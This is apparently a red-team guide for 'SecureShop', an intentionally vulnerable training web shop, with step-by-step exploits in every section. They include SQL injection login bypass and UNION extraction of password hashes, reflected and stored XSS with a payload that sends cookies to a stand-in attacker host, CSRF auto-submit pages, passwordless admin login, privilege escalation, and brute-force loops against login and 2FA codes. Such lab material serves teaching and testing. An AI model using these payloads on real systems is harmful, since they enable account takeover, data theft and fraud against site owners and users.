# SecureShop — Red Team Attack Guide

> **Classification:** ACADEMIC USE ONLY — Intentionally Vulnerable Application  
> **Environment:** Local lab only (`http://127.0.0.1:5000`)  
> **Last Updated:** 2026-11-21

---

## Table of Contents

1. [Setup & Prerequisites](#setup--prerequisites)
2. [Category A — SQL Injection](#category-a--sql-injection)
3. [Category B — Cross-Site Scripting (XSS)](#category-b--cross-site-scripting-xss)
4. [Category C — Cross-Site Request Forgery (CSRF)](#category-c--cross-site-request-forgery-csrf)
5. [Category D — Insecure Direct Object References (IDOR)](#category-d--insecure-direct-object-references-idor)
6. [Category E — Broken Authentication](#category-e--broken-authentication)
7. [Category F — Broken Access Control / Privilege Escalation](#category-f--broken-access-control--privilege-escalation)
8. [Category G — Insecure Session Management](#category-g--insecure-session-management)
9. [Category H — Brute Force / Insufficient Rate Limiting](#category-h--brute-force--insufficient-rate-limiting)
10. [Category I — Open Redirect](#category-i--open-redirect)
11. [Category J — Business Logic Vulnerabilities](#category-j--business-logic-vulnerabilities)
12. [Category K — Security Misconfiguration](#category-k--security-misconfiguration)
13. [Category L — Excessive Trust in Client-Side Controls (Lab 2.1)](#category-l--excessive-trust-in-client-side-controls-lab-21)
14. [Category M — Flawed Business Rule Enforcement (Lab 2.1)](#category-m--flawed-business-rule-enforcement-lab-21)
15. [Category N — Inconsistent Exceptional Input (Lab 2.2)](#category-n--inconsistent-exceptional-input-lab-22)
16. [Category O — Insufficient Workflow Validation (Lab 2.3)](#category-o--insufficient-workflow-validation-lab-23)
17. [Category P — Broken 2FA Logic (Lab 3.1)](#category-p--broken-2fa-logic-lab-31)
18. [Resetting Test Data](#resetting-test-data)

---

## Setup & Prerequisites

### Starting the Application

```bash
cd SecureShop
python init_db.py          # Reset database to clean state
flask --app app run --host 127.0.0.1 --port 5000
```

### Test Accounts

| Username | Password | Role | Credit |
|---|---|---|---|
| `alice` | `alice-demo-pass` | user | $500.00 |
| `admin` | `admin123secure` | admin | $1000.00 |
| `bob` | `bob123secure` | user | $500.00 |

### Test Coupons

| Code | Discount | Assigned To | Max Uses |
|---|---|---|---|
| `WELCOME10` | 10% | Anyone | 1 |
| `WELCOME20` | 20% | Anyone (min $100) | 1 |
| `SINGLE50` | 50% | alice@example.test | 1 |

---

## Category A — SQL Injection

### A-01: Login Bypass via SQL Injection

**Overview:** The `/login/debug` endpoint constructs SQL queries using f-string interpolation, allowing injection.

**Affected Functionality:** Authentication (debug login page)

**Prerequisites:** None

**Step-by-Step Reproduction:**

1. Navigate to `http://127.0.0.1:5000/login/debug`
2. In the username field, enter: `' OR 1=1--`
3. Enter any password
4. Submit the form

**Using curl:**
```bash
curl -X POST http://127.0.0.1:5000/login/debug \
  -d "username=' OR 1=1--&password=anything" \
  -c cookies.txt -L
```

**Expected Behavior:** The injected SQL returns the first user in the database, and the application creates a session for that user.

**Security Impact:** Complete authentication bypass. Attacker gains access to the first user account without knowing credentials.

**Evidence to Capture:** Response showing successful login; session cookie contents.

---

### A-02: Product Search SQL Injection

**Overview:** The `/api/products/search` endpoint uses f-string SQL for the search query.

**Prerequisites:** None

**Step-by-Step Reproduction:**

```bash
# Normal search
curl "http://127.0.0.1:5000/api/products/search?q=laptop"

# SQL Injection - return all products
curl "http://127.0.0.1:5000/api/products/search?q=' OR 1=1--"

# SQL Injection - extract data via UNION
curl "http://127.0.0.1:5000/api/products/search?q=' UNION SELECT id,username,email,password_hash,role,is_verified FROM users--"

# SQL Injection via ORDER BY
curl "http://127.0.0.1:5000/api/products/search?q=test&sort=name;SELECT+1--"
```

**Security Impact:** Data exfiltration from any database table. Can extract user credentials, admin passwords, and coupon codes.

---

### A-03: Admin User Search SQL Injection

**Overview:** The `/api/admin/users/search` endpoint has no access control AND uses injectable SQL.

```bash
# Extract all users
curl "http://127.0.0.1:5000/api/admin/users/search?q=' OR 1=1--"
```

**Security Impact:** Complete user database enumeration without authentication.

---

### A-04: Product Filter SQL Injection

**Overview:** The `/api/products/filter` endpoint interpolates `min_price`, `max_price`, and `order_by` directly.

```bash
# Inject via min_price
curl "http://127.0.0.1:5000/api/products/filter?min_price=0 OR 1=1&max_price=999&order_by=name"

# Inject via order_by
curl "http://127.0.0.1:5000/api/products/filter?min_price=0&max_price=999&order_by=CASE WHEN (SELECT role FROM users WHERE id=2)='admin' THEN name ELSE price END"
```

**Security Impact:** Boolean-based blind SQL injection for data extraction.

---

## Category B — Cross-Site Scripting (XSS)

### B-01: Reflected XSS in Product Search

**Overview:** The search query on `/products` renders with the `|safe` Jinja2 filter.

**Prerequisites:** None

**Step-by-Step Reproduction:**

1. Navigate to: `http://127.0.0.1:5000/products?q=<script>alert('XSS')</script>`
2. Observe the alert dialog

**Evidence:** Screenshot of the alert popup in the browser.

---

### B-02: Reflected XSS in Search Preview

**Overview:** The `/api/search/preview` renders user input directly into raw HTML.

```bash
# Open in browser:
http://127.0.0.1:5000/api/search/preview?q=<img src=x onerror=alert(document.cookie)>
```

**Security Impact:** Cookie theft, session hijacking, keylogging via injected scripts.

---

### B-03: Stored XSS in Product Reviews

**Overview:** Reviews are rendered with `|safe` in the product detail template, allowing persistent XSS.

**Prerequisites:** Authenticated user account

**Step-by-Step Reproduction:**

1. Login as `alice`
2. Navigate to any product (e.g., `/product/1`)
3. In the review field, enter: `<script>alert('Stored XSS')</script>`
4. Submit the review
5. The XSS payload executes for every user who views the product

```bash
# Login first
curl -X POST http://127.0.0.1:5000/login \
  -d "username=alice&password=alice-demo-pass&csrf_token=TOKEN" \
  -c cookies.txt -L

# Post XSS review
curl -X POST http://127.0.0.1:5000/product/1/review \
  -b cookies.txt \
  -d "body=<script>document.location='http://attacker.local/?c='+document.cookie</script>&csrf_token=TOKEN"
```

**Security Impact:** Persistent script execution for all users. Can steal admin cookies when admin views the product.

---

### B-04: Stored XSS in Admin User View

**Overview:** Usernames render with `|safe` in the admin users table, so a username containing HTML/JS executes in the admin's browser.

**Security Impact:** Admin account takeover via cookie theft when admin views the user list.

---

## Category C — Cross-Site Request Forgery (CSRF)

### C-01: CSRF on Cart Operations

**Overview:** All `/api/*` endpoints are exempt from CSRF protection.

**Prerequisites:** Victim has an active session

**Step-by-Step Reproduction:**

Create an HTML file and have the victim open it:

```html
<!-- csrf_attack.html -->
<html>
<body>
  <h1>Free Prize!</h1>
  <form id="f" action="http://127.0.0.1:5000/api/cart/add" method="POST">
    <input type="hidden" name="product_id" value="2">
    <input type="hidden" name="quantity" value="10">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

**Security Impact:** Attacker can add arbitrary items to victim's cart.

---

### C-02: CSRF on Profile Update

```html
<form id="f" action="http://127.0.0.1:5000/api/profile/update" method="POST">
  <input type="hidden" name="username" value="hacked">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>
```

**Security Impact:** Attacker can change victim's username and email, potentially locking them out.

---

## Category D — Insecure Direct Object References (IDOR)

### D-01: User Profile Enumeration

**Overview:** `/api/users/<id>/profile` returns user data without authentication.

```bash
# Enumerate all users
for i in $(seq 1 10); do
  curl -s "http://127.0.0.1:5000/api/users/$i/profile"
  echo
done
```

**Security Impact:** Exposes email, role, verification status, and store credit for any user.

---

### D-02: Order Data Access

```bash
# Access any user's order
curl "http://127.0.0.1:5000/api/orders/1"
```

**Security Impact:** View any user's purchase history, items, and financial details.

---

### D-03: Order Cancellation for Any User

```bash
# Cancel another user's order and trigger refund to THEIR account
curl -X POST "http://127.0.0.1:5000/api/orders/1/cancel"
```

**Security Impact:** Disrupt other users' orders; potentially manipulate refund credits.

---

## Category E — Broken Authentication

### E-01: Passwordless Login

**Overview:** `/login/quick` authenticates by username alone.

```bash
# Login as admin without password
curl -X POST http://127.0.0.1:5000/login/quick \
  -d "username=admin" -c cookies.txt

# Verify session
curl http://127.0.0.1:5000/api/debug/session -b cookies.txt
```

**Security Impact:** Complete account takeover for any known username.

---

### E-02: Username Enumeration

**Overview:** `/api/login` returns different HTTP status codes for non-existent users (404) vs. wrong passwords (401).

```bash
curl -X POST http://127.0.0.1:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"wrong"}'
# → 401 (user exists)

curl -X POST http://127.0.0.1:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"wrong"}'
# → 404 (user does not exist)
```

**Security Impact:** Enumerate valid usernames for targeted password attacks.

---

## Category F — Broken Access Control / Privilege Escalation

### F-01: Unauthenticated Admin Access

```bash
# View all orders (admin function) without any authentication
curl http://127.0.0.1:5000/api/admin/orders

# View all users
curl http://127.0.0.1:5000/api/admin/users

# Manage products
curl http://127.0.0.1:5000/api/admin/products

# Manage coupons
curl http://127.0.0.1:5000/api/admin/coupons
```

---

### F-02: Self-Promotion to Admin

**Overview:** The `/profile` endpoint accepts a `role` field in POST data.

```bash
# Login as alice
curl -X POST http://127.0.0.1:5000/login \
  -d "username=alice&password=alice-demo-pass&csrf_token=TOKEN" \
  -c cookies.txt -L

# Promote self to admin by adding role field
curl -X POST http://127.0.0.1:5000/profile \
  -b cookies.txt \
  -d "username=alice&email=alice@example.test&role=admin&csrf_token=TOKEN"
```

---

### F-03: Grant Admin to Any User

```bash
curl -X POST http://127.0.0.1:5000/api/admin/grant-admin \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1}'
```

**Security Impact:** Any unauthenticated user can make any account an administrator.

---

## Category G — Insecure Session Management

### G-01: Incomplete Logout

**Overview:** Logging out only removes `user_id` from the session; cart and CSRF token persist.

**Reproduction:**
1. Login as alice
2. Add items to cart
3. Logout
4. Observe that cart data persists in the session cookie

---

### G-02: Session Data Exposure

```bash
curl http://127.0.0.1:5000/api/debug/session -b cookies.txt
```

**Security Impact:** Reveals session internals including user_id, csrf_token, and cart contents.

---

## Category H — Brute Force / Insufficient Rate Limiting

### H-01: Unlimited Login Attempts via API

```bash
# Brute force loop (no rate limiting)
for pass in password1 password2 admin123 letmein; do
  curl -s -X POST http://127.0.0.1:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}"
  echo
done
```

**Security Impact:** Unlimited password guessing with no lockout or throttling.

---

### H-02: Verification Code Brute Force

```bash
# Brute force verification codes
for code in $(seq -w 0000 9999); do
  curl -s -X POST http://127.0.0.1:5000/api/verify \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"target@example.test\",\"code\":\"$code\"}"
done
```

---

## Category I — Open Redirect

### I-01: Arbitrary Redirect

```bash
# Redirect to external site
curl -v "http://127.0.0.1:5000/redirect?url=https://evil.com"
# Response: 302 Location: https://evil.com

# Phishing URL
# http://127.0.0.1:5000/redirect?url=https://evil.com/fake-login
```

---

### I-02: Post-Registration Redirect

```bash
curl -v "http://127.0.0.1:5000/register/complete?return_to=https://phishing.com"
```

---

### I-03: Post-Login Redirect

Via form submission with hidden `redirect_url` field:
```html
<form action="http://127.0.0.1:5000/login" method="POST">
  <input name="username" value="alice">
  <input name="password" value="alice-demo-pass">
  <input name="redirect_url" value="https://evil.com/steal-session">
  <input name="csrf_token" value="...">
</form>
```

---

## Category J — Business Logic Vulnerabilities

### J-01: Unlimited Store Credit

```bash
# Add $99,999 to alice's account
curl -X POST http://127.0.0.1:5000/api/apply-store-credit \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "amount": 99999}'
```

---

### J-02: Coupon Info Leakage

```bash
# Get full coupon details without restrictions
curl -X POST http://127.0.0.1:5000/api/apply-coupon \
  -H "Content-Type: application/json" \
  -d '{"code": "SINGLE50"}'
```

**Result:** Returns discount percentage, assignment, usage count — even for coupons assigned to other users.

---

### J-03: Negative Cart Quantities

```bash
curl -X POST http://127.0.0.1:5000/api/cart/update \
  -H "Content-Type: application/json" \
  -d '{"qty_1": -5}'
```

---

## Category K — Security Misconfiguration

### K-01: Configuration Exposure

```bash
curl http://127.0.0.1:5000/api/debug/config
# Returns SECRET_KEY, database path, all Flask config

curl http://127.0.0.1:5000/api/debug/db
# Returns full database schema (CREATE TABLE statements)

curl http://127.0.0.1:5000/api/debug/env
# Returns file paths, debug status
```

---

### K-02: Missing Security Headers on API

```bash
curl -v http://127.0.0.1:5000/api/products/search?q=test 2>&1 | grep -i "x-frame\|csp\|x-content"
# No security headers present
```

---

## Category L — Excessive Trust in Client-Side Controls (Lab 2.1)

### L-01: Client-Controlled Pricing

```bash
# Login and add item to cart
curl -X POST http://127.0.0.1:5000/login/quick -d "username=alice" -c cookies.txt
curl -X POST http://127.0.0.1:5000/api/cart/add -b cookies.txt -d "product_id=2&quantity=1"

# Checkout with client-submitted total of $0.01 (actual price: $999)
curl -X POST http://127.0.0.1:5000/api/checkout \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"total": 0.01}'
```

---

### L-02: Client-Controlled Discount

```bash
curl -X POST http://127.0.0.1:5000/api/checkout \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"discount": 999.99}'
```

---

### L-03: Self-Promotion via Profile Form

```bash
# Add hidden role field to promote to admin
curl -X POST http://127.0.0.1:5000/profile \
  -b cookies.txt \
  -d "username=alice&email=alice@example.test&role=admin&csrf_token=TOKEN"
```

---

## Category M — Flawed Business Rule Enforcement (Lab 2.1)

### M-01: Coupon Reuse

```bash
# Use WELCOME10 on first order (via /api/checkout)
curl -X POST http://127.0.0.1:5000/api/checkout \
  -b cookies.txt -H "Content-Type: application/json" \
  -d '{"coupon": "WELCOME10"}'

# Coupon now has usage_count=1 and max_uses=1
# But /api/checkout doesn't check! Use it again:
curl -X POST http://127.0.0.1:5000/api/cart/add -b cookies.txt -d "product_id=1&quantity=1"
curl -X POST http://127.0.0.1:5000/api/checkout \
  -b cookies.txt -H "Content-Type: application/json" \
  -d '{"coupon": "WELCOME10"}'
```

---

### M-02: Using Another User's Assigned Coupon

```bash
# SINGLE50 is assigned to alice@example.test only
# Login as bob and use it via /api/checkout
curl -X POST http://127.0.0.1:5000/login/quick -d "username=bob" -c bob.txt
curl -X POST http://127.0.0.1:5000/api/cart/add -b bob.txt -d "product_id=1&quantity=1"
curl -X POST http://127.0.0.1:5000/api/checkout \
  -b bob.txt -H "Content-Type: application/json" \
  -d '{"coupon": "SINGLE50"}'
```

---

## Category N — Inconsistent Exceptional Input (Lab 2.2)

### N-01: Negative Quantities

```bash
curl -X POST http://127.0.0.1:5000/api/cart/set-quantity \
  -H "Content-Type: application/json" \
  -d '{"product_id": "1", "quantity": "-10"}'
```

### N-02: Decimal Quantities

```bash
curl -X POST http://127.0.0.1:5000/api/cart/set-quantity \
  -H "Content-Type: application/json" \
  -d '{"product_id": "1", "quantity": "0.001"}'
```

### N-03: Missing Parameters Default Silently

```bash
curl -X POST http://127.0.0.1:5000/api/cart/set-quantity \
  -H "Content-Type: application/json" \
  -d '{"product_id": "1"}'
# quantity defaults to 1 without error
```

---

## Category O — Insufficient Workflow Validation (Lab 2.3)

### O-01: Create Order Without Checkout

```bash
# Skip the entire cart → checkout workflow
curl -X POST http://127.0.0.1:5000/api/order/confirm \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "total": 0.01}'
# Order created with $0.01 total, no items, no payment
```

### O-02: View All Orders Without Authentication

```bash
curl http://127.0.0.1:5000/api/orders/latest
```

### O-03: Cancel and Refund Any Order

```bash
# Create an order, then cancel it for a double refund
curl -X POST http://127.0.0.1:5000/api/orders/1/cancel
# Credit refunded to order owner, order cancelled
```

---

## Category P — Broken 2FA Logic (Lab 3.1)

### P-01: Session Set Before 2FA Completion

```bash
# Submit 2FA form - session is set BEFORE verification
curl -X POST http://127.0.0.1:5000/verify-2fa \
  -d "email=alice@example.test&code=wrong" \
  -c cookies.txt -L

# Check session - user_id is already set!
curl http://127.0.0.1:5000/api/debug/session -b cookies.txt
```

### P-02: Empty Code Bypass

```bash
# Submit empty code to bypass 2FA completely
curl -X POST http://127.0.0.1:5000/verify-2fa \
  -d "email=alice@example.test&code=" \
  -c cookies.txt -L
# Redirected to home as authenticated user
```

### P-03: Cross-User Code Usage

```bash
# Use alice's verification code to authenticate as admin
curl -X POST http://127.0.0.1:5000/verify-2fa \
  -d "email=alice@example.test&code=ALICE_CODE&target_email=admin@example.test" \
  -c cookies.txt -L
```

### P-04: Unlimited 2FA Attempts

```bash
# No rate limiting on 2FA
for code in $(seq -w 000000 000100); do
  curl -s -X POST http://127.0.0.1:5000/verify-2fa \
    -d "email=alice@example.test&code=$code"
done
```

---

## Resetting Test Data

To reset the application to a clean state:

```bash
cd SecureShop
python init_db.py
```

This recreates:
- 3 test users (alice, admin, bob)
- 4 products
- 3 coupons
- Empty orders, reviews, and audit tables

**Note:** All sessions are invalidated when the server restarts.
